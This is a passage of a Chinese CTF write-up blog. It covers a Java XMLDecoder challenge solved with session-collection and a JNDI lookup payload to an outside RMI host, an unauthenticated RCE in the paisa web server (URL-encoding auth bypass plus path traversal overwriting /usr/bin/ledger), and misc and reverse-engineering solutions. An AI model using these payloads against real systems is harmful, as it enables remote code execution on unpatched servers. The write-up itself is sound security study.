headers = sessions[oldpass]    res = requests.post(targeturl+<span class="hljs-string">&quot;/editPass&quot;</span>,data=data,headers=headers)    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;change <span class="hljs-subst">&#123;oldpass&#125;</span> to <span class="hljs-subst">&#123;newpass&#125;</span> success&quot;</span>)    <span class="hljs-keyword">else</span>:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;edit fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">deluser</span>(<span class="hljs-params">passwd</span>):    res = requests.get(targeturl+<span class="hljs-string">&quot;/del&quot;</span>,headers=sessions[passwd])    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;delete <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">addsession</span>(<span class="hljs-params">passwd</span>):    register(passwd)    getsession(passwd)     <span class="hljs-comment">#不带JSESSIONID登录就会新生成一个JSESSIONID，并把username和password存入其中</span>    <span class="hljs-comment">#然后把password和收集到的JSESSIONID存入一个集合当中</span>        deluser(passwd) <span class="hljs-comment"># 删除的仅仅是xml文件  </span></code></pre></div><p>经过不断地addsession我们就可以收集到各种被替换内容对应的<code>JSESSIONID</code></p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;_____&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;____&quot;</span>)</span></span><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:    <span class="hljs-built_in">addsession</span>(s)<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:    <span class="hljs-built_in">addsession</span>(s)<span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;string&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;object&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;/void&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;    &quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;1111111111&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;/11111&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;java&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">addsession</span><span class="hljs-params">(<span class="hljs-string">&quot;11111&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">register</span><span class="hljs-params">(<span class="hljs-string">&quot;haha&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">getsession</span><span class="hljs-params">(<span class="hljs-string">&quot;haha&quot;</span>)</span></span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(sessions)</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs 1c">sessions = &#123;&#x27;<span class="hljs-number">1111</span>1 clas&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=3DDADA<span class="hljs-number">9373</span>5FEE377FF56EF8BB4D36DF&#x27;&#125;, &#x27;s=&quot;org.exa&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=29CDD7E<span class="hljs-number">21332352</span>DCF<span class="hljs-number">0179</span>FBAAF<span class="hljs-number">3277</span>7&#x27;&#125;, &#x27;mple.auth.&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=F4E5C<span class="hljs-number">9770</span>9AEB4BE9B9BEF452FF4C1AF&#x27;&#125;, &#x27;User&quot;&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=<span class="hljs-number">3400</span>1B<span class="hljs-number">3288</span>FA<span class="hljs-number">1312</span>8D<span class="hljs-number">240635</span>B0CA0BF1&#x27;&#125;, &#x27;_____&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=C<span class="hljs-number">5255</span>A<span class="hljs-number">7093</span>E<span class="hljs-number">0522194177</span>7A<span class="hljs-number">6854</span>6E158&#x27;&#125;, &#x27;____&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=858B8E2E3B19ED9C<span class="hljs-number">0142</span>EDAC8C04D10D&#x27;&#125;, &#x27;void prope&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=F3EA3DD<span class="hljs-number">0960</span>3E77C<span class="hljs-number">9410</span>BBC<span class="hljs-number">364871</span>2A4&#x27;&#125;, &#x27;rty=&quot;usern&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=CC18DB0DE<span class="hljs-number">6287</span>E<span class="hljs-number">4878</span>BCAEEABAD<span class="hljs-number">3474</span>1&#x27;&#125;, &#x27;ame&quot;&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=2A52DD10FFAC76CE261FA14FBA57F229&#x27;&#125;, &#x27;rty=&quot;passw&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=3A74F4CED350E5EED4C<span class="hljs-number">0056621154</span>E9F&#x27;&#125;, &#x27;ord&quot;&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=562CCFD6EDBA5E26B<span class="hljs-number">1028</span>F<span class="hljs-number">982920</span>E7E0&#x27;&#125;, &#x27;string&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=75C1F992F3EBA13C93B2A<span class="hljs-number">801859</span>1E647&#x27;&#125;, &#x27;object&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=EBEB<span class="hljs-number">7322</span>E<span class="hljs-number">453778</span>D69E370B1EE93EBBA&#x27;&#125;, &#x27;/void&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=6B59B<span class="hljs-number">6860</span>C4EAA2D8B14C291AAC<span class="hljs-number">1131</span>2&#x27;&#125;, &#x27;    &#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=631A6E3E<span class="hljs-number">52784350</span>1AE5E<span class="hljs-number">8642</span>8C1F8A8&#x27;&#125;, &#x27;<span class="hljs-number">1111111111</span>&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=CE2B99F685F3AC<span class="hljs-number">3069</span>9ABD4BC8D90E11&#x27;&#125;, &#x27;/<span class="hljs-number">1111</span>1&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=F80C6E63D6D<span class="hljs-number">862464</span>C94E75BF93CFBB7&#x27;&#125;, &#x27;java&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=4FFCC573DDD7D<span class="hljs-number">7601</span>B240F9B344A<span class="hljs-number">9471</span>&#x27;&#125;, &#x27;<span class="hljs-number">1111</span>1&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=4E6E7BB9E06AC26C61F<span class="hljs-number">4704</span>DC910C3BF&#x27;&#125;, &#x27;haha&#x27;: &#123;&#x27;Cookie&#x27;: &#x27;JSESSIONID=4B<span class="hljs-number">1198</span>B<span class="hljs-number">7321</span>DE26C<span class="hljs-number">437493</span>A69F6A9C25&#x27;&#125;&#125;</code></pre></div><p>然后我们就可以用它去修改对应内容了</p><p>根据提示我们可以使用<code>&lt;!--</code>注释掉内容</p><p>经过替换后达到这样的效果</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;F&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;haha&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">&lt;/!--&gt;</span></code></pre></div><p>为什么那么多1是为了减少xml的长度，不能只注释</p><p>最后替换掉<code>haha</code></p><p>使用闭合注释<code>--&gt;</code>然后是我们想要的xml内容</p><p>WP中给出的利用是jndi注入</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://ip:port/a<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></code></pre></div><p>所以大概就是</p><div class="code-wrapper"><pre><code class="hljs xml">payload1 = &quot;--&gt;<span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">\</span>&quot;<span class="hljs-attr">javax.naming.InitialContext</span>\&quot;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">\</span>&quot;<span class="hljs-attr">lookup</span>\&quot;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://&quot;+rmiserver+&quot;/a<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><span class="hljs-comment">&lt;!--&quot;</span><span class="hljs-comment"></span></code></pre></div><p>最后效果</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;F&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://1.2.3.4:7777/a<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><span class="hljs-comment">&lt;!--&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">111&lt;111&gt;</span><span class="hljs-comment">&lt;/!--&gt;</span></code></pre></div><p>然后wp中使用JRMPListener配合jackson链子构造服务端</p><p>我还是喜欢使用ldap打jackson链</p><p>总而言之，这个题目的关键在于<strong>把想要替换的内容通过登录生成<code>JSESSIONID</code>，然后收集这些session</strong></p><p>最后利用那些session对同一个文件进行替换</p><h2 id="paisa4shell"><a href="#paisa4shell" class="headerlink" title="paisa4shell"></a>paisa4shell</h2><p>pankas师傅已经发布了issue，<a href="https://github.com/ananthakumaran/paisa/issues/294">paisa &lt;&#x3D;v0.7.0 web server has an unauthorized remote command execution vulnerability · Issue #294 · ananthakumaran&#x2F;paisa (github.com)</a></p><p>提示：</p><p>前台RCE，使用官方docker镜像；<a href="https://github.com/ananthakumaran/paisa">https://github.com/ananthakumaran/paisa</a></p><p>鉴权能绕、文件覆盖</p><p>路由逻辑都是在server.go中</p><h3 id="wp分析"><a href="#wp分析" class="headerlink" title="wp分析"></a>wp分析</h3><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024142118859.png" alt="image-20241024142118859"></p><p>使用中间件鉴权</p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024143129801.png" alt="image-20241024143129801"></p><p>主要是判断了是不是<code>/api</code>前缀</p><p>这里就要绕过一下</p><p><code>c.Request.RequestURI</code>获取的是原始的请求URI，gin框架的路由选择是根据 <code>c.Request.URL.Path</code> 来确定的，所以我们可以通过URL编码的方式绕过这个中间件的检测</p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024145113480.png" alt="image-20241024145113480"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024160751871.png" alt="image-20241024160751871"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024162625875.png" alt="image-20241024162625875"></p><p>能够进行文件覆盖</p><p>分析一下<code>/api/editor/validate</code></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024163752763.png" alt="image-20241024163752763"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024163852539.png" alt="image-20241024163852539"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024163921465.png" alt="image-20241024163921465"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024163949526.png" alt="image-20241024163949526"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024164136324.png" alt="image-20241024164136324"></p><p>大概就是会寻找二进制文件<code>ledger</code>所在的路径，然后执行这个文件</p><p>配合上一个能够文件覆盖的功能，我们可以写一个sh文件内容</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/%61pi/sheets/save</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:7500<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>60<span class="language-swift">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;../../../usr/bin/ledger&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;#!/bin/sh<span class="hljs-subst">\n</span>ls /&quot;</span>&#125;</span></code></pre></div><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024164403309.png" alt="image-20241024164403309"></p><p>这个路径可以一个一个试，文件不存在时会显示<code>File does not exist</code></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024164659021.png" alt="image-20241024164659021"></p><p>然后就会执行</p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024164824782.png" alt="image-20241024164824782"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024164832845.png" alt="image-20241024164832845"></p><h3 id="其余发现"><a href="#其余发现" class="headerlink" title="其余发现"></a>其余发现</h3><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024164959688.png" alt="image-20241024164959688"></p><p><code>/api/editor/save</code>同样存在文件覆盖功能</p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024165314507.png" alt="image-20241024165314507"></p><p>存在任意文件读取功能</p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024165259699.png" alt="image-20241024165259699"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>强网拟态2024-volcano</title>
    <link href="/2024/10/20/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/"/>
    <url>/2024/10/20/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/</url>
    
    <content type="html"><![CDATA[<h1 id="强网拟态2024-by-volcano"><a href="#强网拟态2024-by-volcano" class="headerlink" title="强网拟态2024 by volcano"></a>强网拟态2024 by volcano</h1><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/image-20241020125745805.png" alt="image-20241020125745805"></p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/image-20241020125719781.png" alt="image-20241020125719781"></p><p>真tm难打，web都被打烂了，就那么点分</p><p>主要还是校队人员分布不均吧，太缺pwn手了</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000089323.png" alt="img"></p><h2 id="ezflag"><a href="#ezflag" class="headerlink" title="ezflag"></a>ezflag</h2><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007551.png" alt="img"></p><p>追踪tcp发现是个zip</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007552.png" alt="img"></p><p>有个flag.zip</p><p>放入010，发现是png</p><p>修改后缀即可</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007553.png" alt="img"></p><h2 id="Pvz"><a href="#Pvz" class="headerlink" title="Pvz"></a>Pvz</h2><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pyzipper<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>):    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">with</span> pyzipper.AESZipFile(<span class="hljs-string">&quot;how much.zip&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:            pwd = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode()).hexdigest()            file.extractall(pwd=pwd.encode())        <span class="hljs-built_in">print</span>(i)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:        <span class="hljs-keyword">continue</span></code></pre></div><p>压缩包密码爆破出217eedd1ba8c592db97d0dbe54c7adfc，738阳光</p><p>得到两个图片</p><p>M41b0lg3.png</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007554.png" alt="img"></p><p>Zz.png</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007555.png" alt="img"></p><p>恢复了一下，用支付宝扫码</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007556.png" alt="img"></p><div class="code-wrapper"><pre><code class="hljs Bash">D<span class="hljs-string">&#x27;`_q^K![YG&#123;VDTveRc10qpnJ+*)G!~f1&#123;d@-&#125;v&lt;)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@&quot;&gt;76Z:321U54-21*Non,+*#G&#x27;</span>&amp;%<span class="hljs-variable">$d</span><span class="hljs-string">&quot;y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^W\UZSwWVUNrRQ3IHGLEiCBAFE&gt;=aA:9&gt;765:981Uvu-2+O/.nm+<span class="hljs-variable">$Hi</span>&#x27;~&#125;|B&quot;</span>!~&#125;|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]\UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+*Non&amp;%*)(<span class="hljs-string">&#x27;&amp;&#125;C&#123;cy?&#125;|&#123;zs[q7unVl2ponmleMib(fHG]b[Z~k</span></code></pre></div><p>盲猜一手 Malbolge</p><p><a href="https://malbolge.doleczek.pl/">https://malbolge.doleczek.pl/</a></p><div class="code-wrapper"><pre><code class="hljs Python">flag&#123;<span class="hljs-number">5</span>108a32f-1c7f-4a40-a4fa-fd8982e6eb49&#125;</code></pre></div><h2 id="Streaming"><a href="#Streaming" class="headerlink" title="Streaming"></a>Streaming</h2><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007557.png" alt="img"></p><p>先把那堆 UDP 解码成 RTP 看看</p><p>参考一下 <a href="https://blog.csdn.net/water1209/article/details/127927245">https://blog.csdn.net/water1209/article/details/127927245</a></p><p>插件 <a href="https://github.com/volvet/h264extractor">https://github.com/volvet/h264extractor</a></p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007558.png" alt="img"></p><p>小黑子</p><p>暂时无法在飞书文档外展示此内容</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/17294000007559.png" alt="img"></p><div class="code-wrapper"><pre><code class="hljs Plain">flag1 is &#x27;flag&#123;3b3a9c08-&#x27;hint:it&#x27;s not just flag!!!</code></pre></div><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Serv1ce"><a href="#Serv1ce" class="headerlink" title="Serv1ce"></a>Serv1ce</h2><p>动调可以得知并dump出传入check中的输入、keyarray和num，对应so中的逻辑写脚本爆破可得</p><div class="code-wrapper"><pre><code class="hljs Python">keyArray = [<span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">229</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">173</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">173</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">197</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">229</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">173</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">173</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">197</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">229</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">173</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">197</span>, <span class="hljs-number">226</span>, <span class="hljs-number">173</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">226</span>, <span class="hljs-number">197</span>, <span class="hljs-number">197</span>, <span class="hljs-number">173</span>, <span class="hljs-number">226</span>, <span class="hljs-number">229</span>, <span class="hljs-number">197</span>]v = [<span class="hljs-number">0xB9</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x67</span>]num = <span class="hljs-number">11</span><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(v)):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):        <span class="hljs-keyword">if</span> (num * (i ^ keyArray[c])) &amp; <span class="hljs-number">0xff</span> == v[c]:            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)            <span class="hljs-keyword">break</span><span class="hljs-comment"># f4c99233-3b19-426c-8ca6-a44d1c67f5d8</span></code></pre></div><h2 id="Easyre"><a href="#Easyre" class="headerlink" title="Easyre"></a>Easyre</h2><p>挺复杂的花指令</p><p>估计必须写angr&#x2F;unicorn脚本才能解了，实在不会&#x2F;(ㄒoㄒ)&#x2F;~~</p><h2 id="Babyre"><a href="#Babyre" class="headerlink" title="Babyre"></a>Babyre</h2><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> __int8 char</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> _QWORD long long</span><span class="hljs-type">int</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">int</span> num)</span> &#123;    <span class="hljs-type">int</span> v1; <span class="hljs-comment">// r8d</span>    <span class="hljs-type">int</span> v2; <span class="hljs-comment">// ecx</span>    <span class="hljs-type">int</span> v3; <span class="hljs-comment">// ecx</span>    <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span>    <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-34h]</span>    <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span>    <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+14h] [rbp-2Ch]</span>    <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span>    <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+1Ch] [rbp-24h]</span>    <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span>    <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [rsp+24h] [rbp-1Ch]</span>    <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span>    <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [rsp+2Ch] [rbp-14h]</span>    <span class="hljs-type">int</span> v15; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span>    <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v17; <span class="hljs-comment">// [rsp+3Ch] [rbp-4h]</span>    <span class="hljs-type">char</span> a1[<span class="hljs-number">12</span>] = &#123;<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">3</span>; ++j )    &#123;      a1[<span class="hljs-number">11</span> - j] = index &amp; <span class="hljs-number">1</span>;      index &gt;&gt;= <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">7</span>; ++k )    &#123;      a1[<span class="hljs-number">7</span> - k] = num &amp; <span class="hljs-number">1</span>;      num &gt;&gt;= <span 